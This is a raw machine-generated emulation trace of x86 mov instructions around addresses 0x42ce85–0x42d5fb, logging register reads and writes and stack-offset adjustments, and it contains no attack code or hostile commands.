regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42ce85: mov dword ptr [ebp - 0x118], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42ce8b: mov edx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42ce93: mov dword ptr [ebp - 0xe4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42ce99: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42ce9b: mov dword ptr [ebp - 0xf4], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42cea3: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42cea5: mov esi, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42cead: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42ceaf: mov edi, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42cec4: mov dword ptr [ebp - 0x124], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x42ceca: mov edx, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42ced0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x42ced8: mov dword ptr [ebp - 0x130], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 4 0x42cee7: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 0x42cef2: mov dword ptr [ebp - 0xa0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42cef8: mov ecx, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 0x42cf00: mov dword ptr [ebp - 0xe0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42cf0a: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42cf12: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42cf1c: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42cf24: mov dword ptr [ebp - 0xfc], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42cf2a: mov edi, esi, regs_read: [29], regs_write: [23] 0x42cf36: mov dword ptr [ebp - 0xe8], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42cf3e: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42cf4f: mov ebx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7fa8 for stack size 0x10000 0x42cf5a: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42cf68: mov ecx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42cf70: mov edx, eax, regs_read: [19], regs_write: [24] 0x42cf7c: mov dword ptr [ebp - 0xe8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42cf86: mov eax, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42cf8e: mov dword ptr [ebp - 0x10c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42cf94: mov ecx, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42cf9c: mov dword ptr [ebp - 0xe8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42cfa2: mov edx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42cfaa: mov dword ptr [ebp - 0xf0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42cfb0: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42cfb2: mov dword ptr [ebp - 0xfc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42cfba: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42cfc0: mov edi, ecx, regs_read: [22], regs_write: [23] 0x42cfcd: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42cfd5: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42cfe3: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42cff1: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42cff3: mov dword ptr [ebp - 0xac], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d001: mov ecx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d009: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d011: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d01b: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d021: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d033: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42d03e: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42d049: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42d053: mov dword ptr [ebp - 0xac], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d05d: mov esi, eax, regs_read: [19], regs_write: [29] 0x42d06b: mov dword ptr [ebp - 0x12c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 saving data to stack: 0 4 0x42d071: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d079: mov ecx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d081: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d089: mov ebx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d091: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d099: mov dword ptr [ebp - 0x104], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x42d09f: mov edi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d0a5: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d0b6: mov dword ptr [ebp - 0x11c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 saving data to stack: 0 4 0x42d0bc: mov dword ptr [ebp - 0x13c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 saving data to stack: 0 4 0x42d0c2: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d0d4: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d0ea: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d0f6: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d0fe: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d10c: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d10e: mov dword ptr [ebp - 0xfc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d11a: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d12a: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d135: mov ecx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d140: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d14a: mov dword ptr [ebp - 0x94], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d150: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d162: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d16a: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d172: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d17a: mov dword ptr [ebp - 0x128], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 0 4 0x42d180: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d18a: mov dword ptr [ebp - 0x100], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x42d190: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d19f: mov dword ptr [ebp - 0x114], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42d1a7: mov edx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d1ad: mov dword ptr [ebp - 0xec], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42d1b3: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42d1bc: mov ebx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42d1cb: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d1dd: mov edi, edx, regs_read: [24], regs_write: [23] 0x42d1e5: mov dword ptr [ebp - 0xd0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d1ef: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42d1f7: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42d205: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d207: mov dword ptr [ebp - 0xbc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42d213: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d223: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42d22e: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d239: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d243: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d245: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d25b: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42d263: mov ecx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42d26b: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42d273: mov dword ptr [ebp - 0xe8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42d27b: mov dword ptr [ebp - 0xbc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42d283: mov dword ptr [ebp - 0x118], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42d289: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d29a: mov dword ptr [ebp - 0x110], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42d2a0: mov edx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42d2a6: mov dword ptr [ebp - 0x120], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42d2ac: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42d2be: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42d2d0: mov edi, edx, regs_read: [24], regs_write: [23] 0x42d2d8: mov dword ptr [ebp - 0xe0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42d2e2: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42d2e8: mov ebx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42d2f0: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42d2fe: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d300: mov dword ptr [ebp - 0xb0], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42d30c: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d31c: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42d324: mov ecx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42d331: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42d33c: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d33e: mov dword ptr [ebp - 0xe0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42d354: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42d35c: mov ecx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42d364: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42d36c: mov dword ptr [ebp - 0x108], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42d374: mov dword ptr [ebp - 0xb0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42d37c: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42d38d: mov dword ptr [ebp - 0x10c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42d393: mov ebx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42d399: mov dword ptr [ebp - 0x140], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x42d39f: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42d3b1: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42d3bf: mov edi, ebx, regs_read: [21], regs_write: [23] 0x42d3c1: mov dword ptr [ebp - 0xac], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d3cf: mov ebx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42d3d7: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42d3df: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42d3ed: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d3ef: mov dword ptr [ebp - 0xbc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42d3fb: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d40b: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42d415: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42d420: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42d42b: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d42d: mov dword ptr [ebp - 0xac], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d443: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42d44b: mov ecx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42d453: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42d45b: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x42d463: mov dword ptr [ebp - 0xbc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42d46b: mov dword ptr [ebp - 0x134], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x42d471: mov edi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d477: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d482: mov ebx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42d48e: mov dword ptr [ebp - 0x108], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42d494: mov dword ptr [ebp - 0x124], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x42d49a: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d4af: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d4c2: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d4ce: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42d4d6: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42d4e4: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d4e6: mov dword ptr [ebp - 0xb0], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42d4f2: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d502: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d50d: mov ecx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d518: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d522: mov dword ptr [ebp - 0x94], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d528: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d53c: mov dword ptr [ebp - 0x114], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42d542: mov dword ptr [ebp - 0xec], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42d548: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42d550: mov ecx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42d556: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42d560: mov dword ptr [ebp - 0xb0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42d568: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d56a: mov ebx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d57f: mov dword ptr [ebp - 0x12c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 saving data to stack: 0 4 0x42d585: mov edx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d58b: mov dword ptr [ebp - 0x104], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x42d591: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42d5a6: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d5b5: mov edi, edx, regs_read: [24], regs_write: [23] 0x42d5bd: mov dword ptr [ebp - 0xd0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d5c7: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d5cf: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d5dd: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d5df: mov dword ptr [ebp - 0xf4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d5eb: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d5fb: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 